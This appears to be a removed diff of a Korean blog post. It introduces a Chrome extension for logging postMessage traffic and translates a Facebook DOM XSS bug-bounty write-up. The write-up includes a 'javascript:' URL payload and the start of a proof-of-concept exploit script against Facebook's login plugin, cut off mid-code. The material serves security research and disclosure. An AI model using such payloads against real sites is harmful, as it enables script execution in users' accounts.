-&lt;p&gt;iframe broker는  &lt;a href=&quot;https://vinothkumar.me/&quot;&gt;Vinoth Kumar&lt;/a&gt;가 Cross Window Communication 로그를 쉽게 확인하기 위해서 작성한 Chrome Extension 입니다.&lt;/p&gt;
-
-&lt;p&gt;해당 도구의 간단한 원리는 message를 후킹하여 보여주는 방식입니다&lt;/p&gt;
-
-&lt;p&gt;Javascript는 아래와 같이 간단한 스크립트로 후킹할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;origin_parse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/* Something Do It! */&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/* ex) console.log(arg) */&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;origin_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;iframe broker의 사용법은 아래와 같습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/vinothsparrow/iframe-broker
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;우선 git clone 명령어를 통해 특정 폴더에 iframe-broker를 받아줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png&quot; alt=&quot;/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Chrome Extension 추가를 위해 개발자 모드 옵션을 활성화 시켜줍니다. 해당 옵션을 활성화 시켜주게되면 &lt;code class=&quot;highlighter-rouge&quot;&gt;압축해제된 확장 프로그램을 로드합니다.&lt;/code&gt; 버튼이 생기며 클릭을 통해 clone 해준 iframe-broker 폴더를 선택해줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png&quot; alt=&quot;/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Iframe Broker가 정상적으로 로드된 것을 확인 할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png&quot; alt=&quot;/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;위와 같이 Chrome Extension을 통해 Domain간 통신하는 메세지를 쉽게 확인 할 수 있으며 클라이언트 사이드의 취약점을 찾는데 편리한 도구라는 생각이듭니다. 아래는 해당 Chrome Extension 개발자가 개발 후 Extension을 사용하면서 직접 취약점을 찾은 내용을 번역했습니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;story-of-20000-facebook-dom-xss&quot;&gt;Story of &lt;a href=&quot;https://vinothkumar.me/20000-facebook-dom-xss/&quot;&gt;$20000 Facebook DOM XSS&lt;/a&gt;&lt;/h1&gt;
-
-&lt;hr /&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;window.postMessage() method를 사용하면 생성 된 페이지와 팝업 사이 또는 페이지와 페이지에 포함된 iframe 사이와 같은 Window 객체 간의 cross-origin 통신을 안전하게 할 수 있습니다. - &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage&quot;&gt;Mozilla postMessage Documentation&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;postMessage 및 도메인 간 통신에 대해 더 알고 싶다면 아래 문서를 읽는 것이 좋습니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://javascript.info/cross-window-communication&quot;&gt;How cross window/frame communication happens in Javascript&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/&quot;&gt;https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/&quot;&gt;https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;postMessage를 통한 DOM XSS는 과소 평가 된 취약점이며 많은 버그바운티 헌터들에게는 눈에 띄지 않는 취약점입니다.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;최근에 open dashboards 및 credentials 취약점을 찾는 대신 클라이언트 쪽 취약점을 찾기 시작했습니다.&lt;/p&gt;
-
-&lt;p&gt;(&lt;a href=&quot;https://hackerone.com/vinothkumar&quot;&gt;HackerOne에 리포트된 보고서&lt;/a&gt;를 본다면 대부분 나의 리포트는 open dashboard 또는 Github credential leak 입니다.)&lt;/p&gt;
-
-&lt;p&gt;처음에는 XSSI, JSONP 및 postMessage 관련 된 보안 문제를 찾기 시작했습니다. 그러나 XSSI 및 JSONP 취약점은 매우 드물며 &lt;a href=&quot;https://blog.reconless.com/samesite-by-default/&quot;&gt;SameSite 쿠키&lt;/a&gt;가 도입 된 이후 이 취약점은 사라질 것입니다. 따라서 postMessage 취약점을 살펴 보는 데 집중했습니다. postMessage 취약점은 주로 보안 연구원이 대부분 무시하지만 디버깅이 쉽고 방화벽을 우회 할 필요가 없습니다.&lt;/p&gt;
-
-&lt;p&gt;또한 디버깅을 더 쉽게하기 위해 페이지에서 발생하는 cross window communication의 view/log를 위한 &lt;a href=&quot;https://github.com/vinothsparrow/iframe-broker&quot;&gt;Chrome extension을 개발&lt;/a&gt; 했습니다.&lt;/p&gt;
-
-&lt;p&gt;일반적으로 웹 사이트는 위젯, 플러그인 또는 웹 SDK에서 iframe 통신을 사용합니다. 따라서 페이스북의 iframe 보안 문제를 찾으려고 시작하자마자 &lt;a href=&quot;https://developers.facebook.com/&quot;&gt;https://developers.facebook.com&lt;/a&gt;으로 이동하여 Facebook의 third-party 플러그인을 보기 시작했습니다.&lt;/p&gt;
-
-&lt;p&gt;그리고 cross-domain 통신을 위해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Facebook Login SDK for JavaScript&lt;/code&gt;는 &lt;code class=&quot;highlighter-rouge&quot;&gt;v6.0/plugins/login_button.php&lt;/code&gt;에서 proxy iframe을 만들며 proxy frame에서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;Continue with Facebook&lt;/code&gt; 버튼을 렌더링 해줍니다. 여기서 흥미로운 점은 javascript SDK가 proxy frame에 버튼의 클릭 URL이 포함 된 초기화 페이로드를 전송 한다는 것입니다.&lt;/p&gt;
-
-&lt;p&gt;로그인 SDK의 흐름은 아래와 같습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Third&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Party&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;website&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Facebook&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Login&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SDK&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JavaScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;↓&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;amp;button_type=continue_with&amp;amp;channel=REDIRECT_URL&amp;amp;sdk=joey&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;↓&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Facebook Javascript SDK는 초기화 payload를 iframe proxy에게 보냅니다.&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contentWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdArbiterHandleMessage&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;loginButtonStateInit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;INT_ID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&amp;amp;SOME_OTHER_PARAMS&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;dims&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenY&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;971&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}})},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;APP_DOMAIN&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;↓&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 유저가 Login with Facebook 버튼을 클릭하면 proxy iframe에서 특정 URL을 open 합니다.&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;↓&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 팝업 윈도우는 accesstoken과 signed-request를 third-party website에게 postMessage를 사용하여 보냅니다.&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;해당 초기화 payload를 주의 깊게 살펴보면 SDK가 Facebook 플러그인 iframe으로 전송합니다. url 파라미터는 i라는 변수에 저장 되며 버튼이 클릭 되어 이벤트가 트리거 될 때 아래 함수가 실행됩니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png&quot; alt=&quot;/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/cbt=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cbt=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;buildPopupFeatureString&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위 Javascript 코드를 보았을 때 나는 “무언가 왔구나! 취약점이 내게 왔구나! 😉”를 느꼈습니다.&lt;/p&gt;
-
-&lt;p&gt;왜냐하면 Javascript 코드에는 URL/Scheme 유효성 검사가 존재하지 않았습니다. 따라서 아래와 같이 DOM XSS를 할 수 있었습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;window.open('javascript:alert(document.domain)')&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;그래서 우리가 &lt;code class=&quot;highlighter-rouge&quot;&gt;url:'javascript:alert(document.domain)'&lt;/code&gt;와 같은 페이로드를 보내는 경우 받는 사람은 iframe이 &lt;a href=&quot;https://www.facebook.com/v6.0/plugins/login_button.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.facebook.com/v6.0/plugins/login_button.php&lt;/code&gt;&lt;/a&gt;를 방문하고 사용자가 &lt;code class=&quot;highlighter-rouge&quot;&gt;Continue With Facebook&lt;/code&gt;버튼을 클릭하게 되면  &lt;a href=&quot;http://facebook.com/&quot;&gt;facebook.com&lt;/a&gt; 도메인에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;javascript:alert(document.domain)&lt;/code&gt;와 같은 Javascript가 실행됩니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;exploiting-the-iframe&quot;&gt;Exploiting the Iframe&lt;/h2&gt;
-
-&lt;p&gt;위 보안 이슈를 통해 익스플로잇 하는 방법은 2가지가 있습니다.&lt;/p&gt;
-
-&lt;h3 id=&quot;1-pop-up-method&quot;&gt;1. Pop-up Method&lt;/h3&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
-   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opener&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;amp;auto_logout_link=false&amp;amp;button_type=continue_with&amp;amp;channel=REDIRECT_URL&amp;amp;container_width=734&amp;amp;locale=en_US&amp;amp;sdk=joey&amp;amp;size=large&amp;amp;use_continue_as=true&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-   
-   &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
